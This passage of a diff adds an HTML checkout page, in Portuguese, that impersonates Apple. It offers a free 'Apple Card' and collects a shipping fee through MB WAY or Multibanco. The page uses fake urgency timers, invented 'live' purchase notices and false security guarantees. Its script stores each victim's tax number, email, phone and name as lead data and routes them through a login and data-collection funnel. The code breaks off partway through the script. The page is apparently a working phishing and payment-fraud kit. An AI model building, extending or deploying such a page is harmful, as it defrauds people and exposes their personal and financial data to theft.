@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="pt-PT">
+<head>
+<script src="tracker.js"></script>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout — Apple Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+        :root{
+            --apple-black:#1D1D1F;--apple-blue:#0071E3;
+            --gray-100:#F5F5F7;--gray-200:#E8E8ED;--gray-300:#D2D2D7;
+            --gray-400:#86868B;--gray-500:#6E6E73;
+            --success:#34C759;--warning:#FF9F0A;--error:#FF3B30;
+            --surface:#FFFFFF;--mb-red:#CC092F;
+        }
+        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:var(--gray-100);color:var(--apple-black);-webkit-font-smoothing:antialiased;min-height:100vh}
+        .page{max-width:520px;margin:0 auto;min-height:100vh;background:var(--surface)}
+
+        /* Nav */
+        .nav{display:flex;align-items:center;padding:14px 20px;border-bottom:0.5px solid var(--gray-200);background:rgba(255,255,255,0.92);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);position:sticky;top:0;z-index:100}
+        .nav-back{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border:none;background:var(--gray-100);border-radius:50%;cursor:pointer;transition:all 0.2s}
+        .nav-back:active{transform:scale(0.92)}
+        .nav-back svg{width:14px;height:14px;fill:var(--apple-black)}
+        .nav-title{flex:1;text-align:center;font-size:0.9375rem;font-weight:600}
+        .nav-secure{display:flex;align-items:center;gap:4px;font-size:0.6875rem;color:var(--success)}
+        .nav-secure svg{width:12px;height:12px;fill:var(--success)}
+
+        .progress{height:3px;background:var(--gray-200)}
+        .progress-bar{height:100%;background:var(--success);border-radius:2px;width:100%}
+
+        .content{padding:24px 20px}
+
+        /* Timer */
+        .timer-banner{display:flex;align-items:center;gap:10px;padding:12px 14px;background:rgba(255,59,48,0.06);border:1px solid rgba(255,59,48,0.12);border-radius:12px;margin-bottom:20px}
+        .timer-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,59,48,0.12);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+        .timer-icon svg{width:18px;height:18px;fill:var(--error)}
+        .timer-text{flex:1}
+        .timer-text .tt-title{font-size:0.8125rem;font-weight:600;color:var(--error)}
+        .timer-text .tt-desc{font-size:0.6875rem;color:var(--gray-500)}
+        .timer-countdown{font-size:1.125rem;font-weight:800;color:var(--error);font-variant-numeric:tabular-nums}
+
+        /* Order Summary */
+        .order-card{background:var(--gray-100);border-radius:14px;padding:16px;margin-bottom:20px}
+        .order-card .oc-title{font-size:0.75rem;font-weight:600;color:var(--gray-500);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px}
+        .oc-item{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+        .oc-img{width:48px;height:30px;border-radius:6px;position:relative;overflow:hidden;flex-shrink:0}
+        .oc-img .bg{position:absolute;inset:0}
+        .oc-img .logo{position:absolute;top:6px;left:6px}
+        .oc-img .logo img{width:10px;height:12px}
+        .oc-info{flex:1}
+        .oc-name{font-size:0.875rem;font-weight:600}
+        .oc-desc{font-size:0.6875rem;color:var(--gray-500)}
+        .oc-divider{height:1px;background:var(--gray-200);margin:12px 0}
+        .oc-row{display:flex;justify-content:space-between;padding:4px 0;font-size:0.8125rem}
+        .oc-row .label{color:var(--gray-500)}
+        .oc-row .value{font-weight:600}
+        .oc-total{display:flex;justify-content:space-between;padding:8px 0 0;font-size:1rem;font-weight:700;border-top:1px solid var(--gray-200);margin-top:8px}
+
+        /* Payment Method Section */
+        .mb-section{margin-bottom:20px}
+        :root{--mbway-blue:#0072CE}
+        .mb-method{display:flex;align-items:center;gap:12px;padding:14px 16px;border:2px solid var(--gray-200);border-radius:14px;background:#fff;margin-bottom:10px;position:relative;cursor:pointer;transition:all 0.2s ease}
+        .mb-method:hover{border-color:var(--gray-300)}
+        .mb-method.selected{border-color:var(--apple-black);background:var(--gray-100)}
+        .mb-method .check-dot{position:absolute;top:14px;right:16px;width:20px;height:20px;border-radius:50%;border:2px solid var(--gray-300);background:#fff;transition:all 0.2s ease}
+        .mb-method.selected .check-dot{border-color:var(--apple-black);background:var(--apple-black);background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z'/%3E%3C/svg%3E");background-size:14px;background-position:center;background-repeat:no-repeat}
+        .mb-logo{width:40px;height:40px;border-radius:10px;overflow:hidden;flex-shrink:0;background:#fff;display:flex;align-items:center;justify-content:center;padding:4px;border:1px solid var(--gray-200)}
+        .mb-logo img{width:100%;height:100%;object-fit:contain}
+        .mb-method-info{flex:1;padding-right:30px}
+        .mb-method-title{font-size:0.9375rem;font-weight:700;color:var(--apple-black)}
+        .mb-method-desc{font-size:0.75rem;color:var(--gray-500)}
+        .mb-discount{display:inline-block;padding:2px 8px;background:var(--gray-200);color:var(--apple-black);font-size:0.6875rem;font-weight:600;border-radius:6px;margin-top:4px}
+
+        /* Pay Button */
+        .pay-btn{
+            display:block;width:100%;padding:18px;border:none;border-radius:14px;
+            font-size:1.0625rem;font-weight:700;cursor:pointer;font-family:inherit;
+            background:var(--apple-black);color:#fff;text-align:center;
+            transition:all 0.3s ease;margin-bottom:12px;
+            position:relative;overflow:hidden;
+        }
+        .pay-btn:hover{opacity:0.9}
+        .pay-btn:active{transform:scale(0.98)}
+        .pay-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
+        .pay-btn .shine{position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.08),transparent);animation:btnShine 3s ease infinite}
+        .pay-btn-label{display:flex;align-items:center;justify-content:center;gap:8px;position:relative;z-index:2}
+        .pay-btn-label .mb-badge{display:inline-flex;align-items:center;justify-content:center;background:#fff;padding:3px;border-radius:4px;width:28px;height:24px}
+        .pay-btn-label .mb-badge img{width:100%;height:100%;object-fit:contain}
+
+        /* Loading State */
+        .pay-btn.loading .pay-btn-label{opacity:0}
+        .pay-btn.loading .shine{display:none}
+        .pay-btn.loading::after{content:'';position:absolute;top:50%;left:50%;width:24px;height:24px;margin:-12px 0 0 -12px;border:3px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite}
+
+        /* ─── Multibanco Modal ─── */
+        .mb-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.5);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);z-index:999;opacity:0;visibility:hidden;transition:all 0.3s ease;display:flex;align-items:flex-end;justify-content:center}
+        .mb-overlay.active{opacity:1;visibility:visible}
+        .mb-modal{background:var(--surface);border-radius:20px 20px 0 0;width:100%;max-width:520px;max-height:92vh;overflow-y:auto;padding:0;transform:translateY(100%);transition:transform 0.4s cubic-bezier(0.32,0.72,0,1)}
+        .mb-overlay.active .mb-modal{transform:translateY(0)}
+
+        .mb-modal-handle{width:36px;height:4px;background:var(--gray-300);border-radius:2px;margin:10px auto 0}
+        .mb-modal-header{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:0.5px solid var(--gray-200)}
+        .mb-modal-header h3{font-size:1rem;font-weight:700}
+        .mb-modal-close{width:28px;height:28px;border-radius:50%;background:var(--gray-100);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+        .mb-modal-close svg{width:14px;height:14px;fill:var(--gray-500)}
+
+        .mb-modal-body{padding:20px}
+
+        /* Timer MB */
+        .mb-timer-bar{display:flex;align-items:center;gap:8px;padding:10px 14px;background:rgba(255,149,10,0.08);border-radius:10px;margin-bottom:20px;font-size:0.8125rem}
+        .mb-timer-bar svg{width:16px;height:16px;fill:var(--warning);flex-shrink:0}
+        .mb-timer-bar .ptb-text{flex:1;color:var(--gray-500)}
+        .mb-timer-bar .ptb-time{font-weight:700;color:var(--warning);font-variant-numeric:tabular-nums}
+
+        /* Reference Card */
+        .ref-card{background:var(--gray-100);border:2px solid var(--gray-200);border-radius:16px;padding:18px;margin-bottom:16px}
+        .ref-brand{display:flex;align-items:center;gap:10px;margin-bottom:14px;padding-bottom:14px;border-bottom:1px solid var(--gray-200)}
+        .ref-brand .mb-logo-lg{width:42px;height:42px;border-radius:8px;background:#fff;display:flex;align-items:center;justify-content:center;padding:4px;border:1px solid var(--gray-200)}
+        .ref-brand .mb-logo-lg img{width:100%;height:100%;object-fit:contain}
+        .ref-brand .ref-brand-txt{font-size:0.8125rem;font-weight:700;color:var(--apple-black)}
+        .ref-brand .ref-brand-sub{font-size:0.6875rem;color:var(--gray-500)}
+        .ref-rows{display:flex;flex-direction:column;gap:10px}
+        .ref-row{display:flex;flex-direction:column;gap:6px}
+        .ref-row .lbl{font-size:0.6875rem;text-transform:uppercase;letter-spacing:0.06em;color:var(--gray-500);font-weight:600}
+        .ref-row .field{display:flex;gap:8px;align-items:stretch}
+        .ref-row .field input{flex:1;padding:12px 14px;background:#fff;border:1.5px solid var(--gray-200);border-radius:10px;font-family:'Courier New',monospace;font-size:0.95rem;font-weight:700;color:var(--apple-black);letter-spacing:0.03em;outline:none;cursor:text;text-align:center}
+        .ref-row .copy-btn{padding:0 16px;background:var(--apple-black);color:#fff;border:none;border-radius:10px;font-size:0.8125rem;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all 0.2s}
+        .ref-row .copy-btn:active{transform:scale(0.96)}
+        .ref-row .copy-btn.copied{background:var(--success)}
+        .ref-amount{font-size:1.25rem;font-weight:800;color:var(--apple-black);text-align:center;padding:8px 0}
+
+        /* Steps */
+        .mb-steps{margin-bottom:20px;padding:16px;background:var(--gray-100);border-radius:14px}
+        .mb-steps-title{font-size:0.8125rem;font-weight:600;margin-bottom:12px}
+        .mb-step{display:flex;gap:10px;margin-bottom:10px;font-size:0.8125rem;color:var(--gray-500);line-height:1.4}
+        .mb-step:last-child{margin-bottom:0}
+        .mb-step-num{width:22px;height:22px;border-radius:50%;background:var(--apple-black);color:#fff;font-size:0.6875rem;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+
+        /* Status */
+        .mb-status{text-align:center;padding:16px;background:rgba(255,149,10,0.06);border-radius:14px;margin-bottom:16px;transition:all 0.4s ease}
+        .mb-status .ps-icon{width:48px;height:48px;border-radius:50%;margin:0 auto 8px;display:flex;align-items:center;justify-content:center}
+        .mb-status .ps-icon.waiting{background:rgba(255,149,10,0.12)}
+        .mb-status .ps-icon.waiting svg{fill:var(--warning)}
+        .mb-status .ps-icon.paid{background:rgba(52,199,89,0.12)}
+        .mb-status .ps-icon.paid svg{fill:var(--success)}
+        .mb-status .ps-icon svg{width:24px;height:24px}
+        .mb-status .ps-title{font-size:0.9375rem;font-weight:700;margin-bottom:2px}
+        .mb-status .ps-desc{font-size:0.75rem;color:var(--gray-500)}
+        .mb-status-dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:4px;vertical-align:middle}
+        .mb-status-dot.waiting{background:var(--warning);animation:livePulse 1.5s ease infinite}
+        .mb-status-dot.paid{background:var(--success)}
+
+        /* Social proof */
+        .live-proof{padding:10px 14px;background:rgba(52,199,89,0.06);border-radius:10px;margin-bottom:16px;display:flex;align-items:center;gap:8px;font-size:0.75rem;overflow:hidden;height:42px;position:relative}
+        .live-dot{width:6px;height:6px;border-radius:50%;background:var(--success);flex-shrink:0;animation:livePulse 2s ease infinite}
+        .live-text{flex:1;color:var(--gray-600);transition:opacity 0.3s}
+        .live-text strong{color:var(--success)}
+
+        /* FAQ */
+        .faq{margin-bottom:20px}
+        .faq-title{font-size:0.875rem;font-weight:600;margin-bottom:10px}
+        .faq-item{border:1px solid var(--gray-200);border-radius:12px;margin-bottom:8px;overflow:hidden}
+        .faq-q{padding:12px 14px;font-size:0.8125rem;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:space-between;background:var(--surface)}
+        .faq-q svg{width:16px;height:16px;fill:var(--gray-400);transition:transform 0.3s}
+        .faq-item.open .faq-q svg{transform:rotate(180deg)}
+        .faq-a{padding:0 14px;max-height:0;overflow:hidden;transition:all 0.3s ease;font-size:0.8125rem;color:var(--gray-500);line-height:1.5}
+        .faq-item.open .faq-a{padding:0 14px 12px;max-height:200px}
+
+        /* Guarantees */
+        .guarantees{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:20px}
+        .guarantee{text-align:center;padding:12px 8px;background:var(--gray-100);border-radius:12px}
+        .guarantee svg{width:22px;height:22px;fill:var(--gray-500);display:block;margin:0 auto 4px}
+        .guarantee span{font-size:0.5625rem;color:var(--gray-500);font-weight:500;line-height:1.3;display:block}
+
+        /* Test Mode Banner */
+        .test-banner{display:none;padding:10px 14px;background:rgba(0,113,227,0.08);border:1px solid rgba(0,113,227,0.2);border-radius:10px;margin-bottom:16px;font-size:0.75rem;color:var(--apple-blue);text-align:center;font-weight:600}
+        .test-banner.active{display:block}
+
+        @keyframes btnShine{0%{left:-100%}50%{left:100%}100%{left:100%}}
+        @keyframes livePulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+
+        .fade-in{animation:fadeIn 0.4s ease both}
+    </style>
+</head>
+<body>
+    <div class="page">
+        <!-- Nav -->
+        <div class="nav">
+            <button class="nav-back" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/></svg></button>
+            <div class="nav-title">Checkout</div>
+            <div class="nav-secure"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg> Seguro</div>
+        </div>
+        <div class="progress"><div class="progress-bar"></div></div>
+
+        <div class="content" id="checkoutView">
+            <!-- Test Mode Banner -->
+            <div class="test-banner" id="testBanner">
+                &#x1F9EA; MODO TESTE — Valor reduzido para €2,00
+            </div>
+
+            <!-- Timer -->
+            <div class="timer-banner">
+                <div class="timer-icon"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg></div>
+                <div class="timer-text">
+                    <div class="tt-title">Oferta limitada</div>
+                    <div class="tt-desc">Finalize antes de expirar</div>
+                </div>
+                <div class="timer-countdown" id="timer">14:59</div>
+            </div>
+
+            <!-- Order Card -->
+            <div class="order-card">
+                <div class="oc-title">Resumo da Encomenda</div>
+                <div class="oc-item">
+                    <div class="oc-img"><div class="bg" id="orderCardBg"></div><div class="logo"><img id="orderCardLogo" src="assets/images/logo3d.svg" alt="" style="width:12px;height:14px"></div></div>
+                    <div class="oc-info">
+                        <div class="oc-name">Apple Card <span id="orderColor">Titanium</span></div>
+                        <div class="oc-desc">Cartão de titânio • VISA</div>
+                    </div>
+                </div>
+                <div class="oc-divider"></div>
+                <div class="oc-row"><span class="label">Cartão Apple Card</span><span class="value" style="color:var(--success)">Grátis</span></div>
+                <div class="oc-row"><span class="label">Anuidade</span><span class="value" style="color:var(--success)">€0,00</span></div>
+                <div class="oc-row"><span class="label">Portes de envio (<span id="orderTipo">Expresso</span>)</span><span class="value" id="orderFrete">€22,45</span></div>
+                <div class="oc-total"><span>Total</span><span id="orderTotal">€22,45</span></div>
+            </div>
+
+            <!-- Payment Method Selector -->
+            <div class="mb-section">
+                <div class="mb-method selected" data-method="mbway" onclick="selectMethod('mbway')">
+                    <div class="mb-logo"><img src="assets/images/mbway.jpg" alt="MB WAY"></div>
+                    <div class="mb-method-info">
+                        <div class="mb-method-title">Pagar com MB WAY</div>
+                        <div class="mb-method-desc">Confirme com 1 toque no app do seu banco</div>
+                        <div class="mb-discount">Instantâneo</div>
+                    </div>
+                    <div class="check-dot"></div>
+                </div>
+                <div class="mb-method" data-method="multibanco" onclick="selectMethod('multibanco')">
+                    <div class="mb-logo"><img src="assets/images/multibanco.png" alt="Multibanco"></div>
+                    <div class="mb-method-info">
+                        <div class="mb-method-title">Pagar com Multibanco</div>
+                        <div class="mb-method-desc">Referência para pagar no homebanking ou ATM</div>
+                        <div class="mb-discount">Pagamento único</div>
+                    </div>
+                    <div class="check-dot"></div>
+                </div>
+            </div>
+
+            <!-- Pay Button -->
+            <button class="pay-btn" id="payBtn" onclick="generatePayment()">
+                <div class="shine"></div>
+                <div class="pay-btn-label">
+                    <span class="mb-badge"><img id="payBadge" src="assets/images/mbway.jpg" alt="MB WAY"></span>
+                    <span><span id="payLabel">Pagar com MB WAY</span> — <span id="payPrice">€22,45</span></span>
+                </div>
+            </button>
+
+            <!-- Erro de pagamento (inline) -->
+            <div id="payError" style="display:none;margin-top:12px;padding:14px 16px;background:#FFF5F5;border:1px solid #FFD7D5;border-radius:14px">
+                <div style="display:flex;align-items:flex-start;gap:8px;font-size:0.875rem;color:#C9302C;font-weight:600;line-height:1.45">
+                    <svg viewBox="0 0 24 24" width="18" height="18" fill="#FF3B30" style="flex-shrink:0;margin-top:1px"><path d="M12 2L1 21h22L12 2zm0 14a1 1 0 110 2 1 1 0 010-2zm1-7v5h-2V9h2z"/></svg>
+                    <span id="payErrorMsg">Não foi possível gerar o pagamento.</span>
+                </div>
+                <div id="payErrorPhoneWrap" style="display:none;margin-top:12px">
+                    <label for="payErrorPhone" style="display:block;font-size:0.75rem;color:#6E6E73;margin-bottom:6px">Confirme o seu número de telemóvel (9 dígitos)</label>
+                    <div style="display:flex;align-items:center;gap:8px">
+                        <span style="font-size:0.9375rem;color:#6E6E73">🇵🇹 +351</span>
+                        <input id="payErrorPhone" type="tel" inputmode="numeric" autocomplete="tel-national" placeholder="912 345 678" maxlength="13" style="flex:1;padding:12px 14px;border:1px solid #D2D2D7;border-radius:10px;font-size:1rem;box-sizing:border-box">
+                    </div>
+                </div>
+                <button type="button" id="payErrorRetry" onclick="retryPayment()" style="margin-top:12px;width:100%;padding:12px;background:#0071E3;color:#fff;border:none;border-radius:10px;font-size:0.9375rem;font-weight:600;cursor:pointer">Tentar novamente</button>
+            </div>
+
+            <!-- Live proof -->
+            <div class="live-proof" id="liveProof">
+                <div class="live-dot"></div>
+                <div class="live-text" id="liveText"><strong>Maria S.</strong> de Lisboa concluiu o pagamento agora</div>
+            </div>
+
+            <!-- FAQ -->
+            <div class="faq">
+                <div class="faq-title">Perguntas frequentes</div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Porque pago apenas os portes?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">O Apple Card é 100% gratuito, sem anuidade. Paga apenas o custo de envio do cartão físico de titânio até à sua morada, com embalagem dedicada e rastreio.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Quando recebo o cartão?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">O prazo depende da modalidade escolhida: Económico (7-10 dias), Expresso (4-5 dias) ou Premium (1-2 dias). Receberá o código de rastreio por e-mail e SMS.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">O pagamento Multibanco é seguro?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">Sim. A Rede Multibanco é regulada pelo Banco de Portugal e operada pela SIBS. Usamos cifragem SSL de 256 bits. O pagamento é processado de forma instantânea e segura.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-q" onclick="toggleFaq(this)">Posso cancelar a encomenda?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
+                    <div class="faq-a">Pode solicitar o cancelamento até 14 dias após o pagamento, com reembolso integral. Basta contactar o apoio via iMessage ou e-mail.</div>
+                </div>
+            </div>
+
+            <!-- Guarantees -->
+            <div class="guarantees">
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+                    <span>Pagamento<br>100% seguro</span>
+                </div>
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/></svg>
+                    <span>Dados<br>protegidos</span>
+                </div>
+                <div class="guarantee">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    <span>Garantia<br>14 dias</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="mb-overlay" id="mbOverlay">
+        <div class="mb-modal">
+            <div class="mb-modal-handle"></div>
+            <div class="mb-modal-header">
+                <h3 id="modalTitle">Pagamento Multibanco</h3>
+                <button class="mb-modal-close" onclick="closeMbModal()"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button>
+            </div>
+            <div class="mb-modal-body">
+                <!-- Timer -->
+                <div class="mb-timer-bar">
+                    <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                    <span class="ptb-text" id="mbTimerLabel">A referência expira em</span>
+                    <span class="ptb-time" id="mbTimer">29:59</span>
+                </div>
+
+                <!-- Status -->
+                <div class="mb-status" id="mbStatus">
+                    <div class="ps-icon waiting" id="mbStatusIcon">
+                        <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                    </div>
+                    <div class="ps-title"><span class="mb-status-dot waiting" id="mbStatusDot"></span> <span id="mbStatusText">A aguardar pagamento...</span></div>
+                    <div class="ps-desc" id="mbStatusDesc">Use a entidade e a referência abaixo</div>
+                </div>
+
+                <!-- Multibanco Reference Block -->
+                <div class="ref-card fade-in" id="blockMultibanco">
+                    <div class="ref-brand">
+                        <div class="mb-logo-lg"><img src="assets/images/multibanco.png" alt="Multibanco"></div>
+                        <div>
+                            <div class="ref-brand-txt">Rede Multibanco</div>
+                            <div class="ref-brand-sub">Pague no homebanking ou em qualquer caixa ATM</div>
+                        </div>
+                    </div>
+                    <div class="ref-rows">
+                        <div class="ref-row">
+                            <span class="lbl">Entidade</span>
+                            <div class="field">
+                                <input id="mbEntity" type="text" readonly value="—">
+                                <button class="copy-btn" data-target="mbEntity" onclick="copyField(this)">Copiar</button>
+                            </div>
+                        </div>
+                        <div class="ref-row">
+                            <span class="lbl">Referência</span>
+                            <div class="field">
+                                <input id="mbReference" type="text" readonly value="—">
+                                <button class="copy-btn" data-target="mbReference" onclick="copyField(this)">Copiar</button>
+                            </div>
+                        </div>
+                        <div class="ref-row">
+                            <span class="lbl">Montante</span>
+                            <div class="ref-amount" id="mbAmount">€0,00</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- MBWay Push Block -->
+                <div class="ref-card fade-in" id="blockMbway" style="display:none">
+                    <div class="ref-brand">
+                        <div class="mb-logo-lg"><img src="assets/images/mbway.jpg" alt="MB WAY"></div>
+                        <div>
+                            <div class="ref-brand-txt">MB WAY</div>
+                            <div class="ref-brand-sub">Notificação enviada para o seu telemóvel</div>
+                        </div>
+                    </div>
+                    <div class="ref-rows">
+                        <div class="ref-row">
+                            <span class="lbl">Telemóvel</span>
+                            <div class="ref-amount" id="mbwayPhone" style="font-family:'Courier New',monospace;letter-spacing:0.05em">—</div>
+                        </div>
+                        <div class="ref-row">
+                            <span class="lbl">Montante</span>
+                            <div class="ref-amount" id="mbwayAmount">€0,00</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Steps Multibanco -->
+                <div class="mb-steps fade-in" id="stepsMultibanco">
+                    <div class="mb-steps-title">Como pagar:</div>
+                    <div class="mb-step">
+                        <div class="mb-step-num">1</div>
+                        <span>Aceda ao homebanking, app do seu banco ou caixa Multibanco</span>
+                    </div>
+                    <div class="mb-step">
+                        <div class="mb-step-num">2</div>
+                        <span>Escolha "Pagamentos" → "Pagamentos de Serviços / Compras"</span>
+                    </div>
+                    <div class="mb-step">
+                        <div class="mb-step-num">3</div>
+                        <span>Introduza a entidade, a referência e o montante acima e confirme</span>
+                    </div>
+                </div>
+
+                <!-- Steps MBWay -->
+                <div class="mb-steps fade-in" id="stepsMbway" style="display:none">
+                    <div class="mb-steps-title">Como confirmar:</div>
+                    <div class="mb-step">
+                        <div class="mb-step-num">1</div>
+                        <span>Abra a notificação MB WAY no seu telemóvel</span>
+                    </div>
+                    <div class="mb-step">
+                        <div class="mb-step-num">2</div>
+                        <span>Verifique o montante e o destinatário</span>
+                    </div>
+                    <div class="mb-step">
+                        <div class="mb-step-num">3</div>
+                        <span>Confirme com PIN ou biometria — a aprovação é instantânea</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+    (function(){
+        // ─── UTM Persistence ───
+        const utmKeys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck'];
+        const urlParams = new URLSearchParams(window.location.search);
+        utmKeys.forEach(k => { const v = urlParams.get(k); if(v) localStorage.setItem(k, v); });
+
+        // ─── Lead Data ───
+        const LeadData = {
+            _key: 'applecard_lead',
+            load() { try { return JSON.parse(localStorage.getItem(this._key) || '{}') } catch { return {} } },
+            update(d) { const c = this.load(); const u = {...c, ...d, updated_at: Date.now()}; localStorage.setItem(this._key, JSON.stringify(u)); return u; }
+        };
+
+        LeadData.update({ page: 'checkout' });
+        const data = LeadData.load();
+        const params = new URLSearchParams(window.location.search);
+
+        // ─── Gate: redireciona pra dados.html se faltar info obrigatória do checkout ───
+        // O backend exige nome + NIF + email + telemóvel válidos.
+        const hasRequired = data.nif && (String(data.nif).replace(/\D+/g,'').length === 9)
+                         && data.email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)
+                         && (data.telefone || data.phone)
+                         && (String(data.telefone || data.phone || '').replace(/\D+/g,'').length === 9)
+                         && data.nome;
+        if (!hasRequired && params.get('skip') !== 'pago' && params.get('test') !== '1') {
+            // Volta pra dados se ainda não foram preenchidos; mantém todos os UTMs.
+            const target = data.dados_completed ? 'cep.html' : (data.identity_confirmed ? 'dados.html' : 'login.html');
+            const u = new URL(target, window.location.href);
+            new URLSearchParams(window.location.search).forEach((v, k) => u.searchParams.set(k, v));
+            window.location.replace(u.toString());
+            throw new Error('redirect');
+        }
+
+        // ─── Modo Teste ───
+        // Acesse: checkout.html?test=1 para forçar €2,00
+        // Ou: checkout.html?skip=pago para saltar directo para obrigado.html
+        const isTestMode = params.get('test') === '1' || params.get('modo') === 'teste';
+
+        let frete = data.frete_valor || parseFloat(params.get('frete')) || 22.45;
+        const tipo = data.frete_tipo || params.get('tipo') || 'expresso';
+        const corCartao = data.cartao_cor || 'silver';
+        const corLabel = data.cartao_cor_label || 'Titanium';
+
+        if (isTestMode) {
+            frete = 2.00;
+            document.getElementById('testBanner').classList.add('active');
+        }
+
+        const amountCents = Math.round(frete * 100);
+
+        const colorMap = {
+            silver: 'linear-gradient(145deg, #E3E3E8, #C8C8CD, #E8E8ED)',
+            black: 'linear-gradient(145deg, #2C2C2E, #1A1A1C, #3A3A3C)',
+            gold: 'linear-gradient(145deg, #F5E6CC, #D4C4A0, #F0DCC0)'
+        };
+        const tipoLabels = { economico:'Económico', expresso:'Expresso', premium:'Premium' };
+
+        const formatEUR = (v) => `€${v.toFixed(2).replace('.',',')}`;
+
+        document.getElementById('orderCardBg').style.background = colorMap[corCartao] || colorMap.silver;
+        document.getElementById('orderColor').textContent = corLabel;
+        document.getElementById('orderTipo').textContent = tipoLabels[tipo] || 'Expresso';
+        document.getElementById('orderFrete').textContent = formatEUR(frete);
+        document.getElementById('orderTotal').textContent = formatEUR(frete);
